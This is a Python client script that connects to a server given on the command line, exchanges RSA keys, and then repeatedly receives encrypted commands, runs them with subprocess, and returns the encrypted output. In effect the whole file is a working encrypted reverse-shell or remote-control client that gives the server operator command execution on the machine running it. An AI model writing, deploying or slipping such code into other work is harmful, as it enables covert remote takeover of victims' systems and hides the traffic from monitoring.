import sys
import socket
import rsa
import subprocess

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import math

BUFFER_SIZE = 4096

def authenticate_server(client_socket, public_key):

    client_socket.send(public_key.exportKey(format='PEM', passphrase=None, pkcs=1)) 

    encrypt_key = RSA.importKey(client_socket.recv(4096), passphrase=None) 

    return encrypt_key

def encrypt(msg, key):
    cipher = PKCS1_OAEP.new(key)
    encrypted_msg = cipher.encrypt(msg)
    return encrypted_msg

def decrypt(msg, key):
    cipher = PKCS1_OAEP.new(key)
    decrypted_msg = cipher.decrypt(msg)
    return decrypted_msg.decode()


def send_resp(client_socket, msg):
    client_socket.sendall(msg)

def recv_msg(client_socket, string_size):
    response = b''
    rounds = math.ceil(string_size/BUFFER_SIZE)
    for _ in range(rounds):
        data = client_socket.recv(BUFFER_SIZE)
        response += data
    return response

def execute_command(command):
    command_arr = split_command(command, ' ')
    command_resp = subprocess.run(command_arr, capture_output = True).stdout
    return command_resp

def split_command(string, sep):
    complete_split = string.split(sep)
    return complete_split


def client_program():
    # check user input
    if(len(sys.argv) != 3):
        print("Usage: python client.py <server IP address> <server port number>")
        sys.exit()

    # get server address info
    port = int(sys.argv[2])
    server_ip = socket.gethostbyname(sys.argv[1])

    server_addr = (server_ip, port)

    # create socket and connect to server
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect(server_addr)

    # generate private key and corresponding public key
    private_key = RSA.generate(4096)
    public_key = private_key.publickey()

    # get the key to encrypt with from the server
    encrypt_key = authenticate_server(client_socket, public_key)

    # loop to recieve and run commands
    while True:
        string_size = int(client_socket.recv(10).decode())
        encrypted_command = recv_msg(client_socket, string_size)
        decrypted_command = decrypt(encrypted_command, private_key)

        # break if "exit" is input
        if decrypted_command == 'exit':
            break

        response = execute_command(decrypted_command)
        encrypted_response = encrypt(response, encrypt_key)
        
        size = len(encrypted_response)
        string_size = str(size).zfill(10)
        client_socket.send(string_size.encode())
        
        send_resp(client_socket, encrypted_response)
        
    # close socket once server says to
    client_socket.close()

if __name__ == '__main__':
    client_program()